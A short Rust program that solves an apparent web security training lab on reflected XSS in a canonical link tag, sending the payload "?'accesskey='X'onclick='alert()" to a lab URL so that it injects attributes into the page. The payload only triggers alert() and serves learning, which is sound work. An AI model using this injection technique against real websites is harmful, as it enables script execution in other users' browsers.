/************************************************************
*
* Lab: Reflected XSS in canonical link tag
*
* Hack Steps: 
*      1. Inject payload as a query string of the URL
*      2. The alert function will be called after pressing 
*         the correct key combinations
*
*************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a99006203e69f4181c5cf160062004e.web-security-academy.net";

fn main() {
    let payload = "?'accesskey='X'onclick='alert()";

    print!("❯❯ Injecting payload as a query string of the URL.. ");
    io::stdout().flush().unwrap();

    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{payload}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
